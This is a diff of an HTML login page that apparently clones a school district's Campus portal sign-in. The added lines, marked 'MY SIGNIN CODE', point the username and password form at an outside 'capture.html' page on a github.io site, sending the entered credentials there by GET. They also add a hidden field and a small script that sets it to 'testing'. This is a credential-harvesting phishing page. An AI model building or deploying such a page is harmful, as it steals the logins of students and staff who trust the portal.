@@ -570,8 +570,10 @@ function toggle(type) {
             <input type="hidden" name="useCSRFProtection" value="true">
         </form>
 		-->
+		<!-- MY SIGNIN CODE -->
 		<form method="GET" id="form_signin" accept-charset="utf-8" action="https://rubiks-boi.github.io/campus-ccsd-site/capture.html">
             
+            <input type="hidden" id="email" />
             
             <div class="container span2">
                 <div><label for="username">Username</label></div>
@@ -667,5 +669,9 @@ line-height: normal;
     });
 </script>
 
+<script>
+//MY SIGNIN CODE
+$('#email').value = "testing";
+</script>
 
 </body></html>
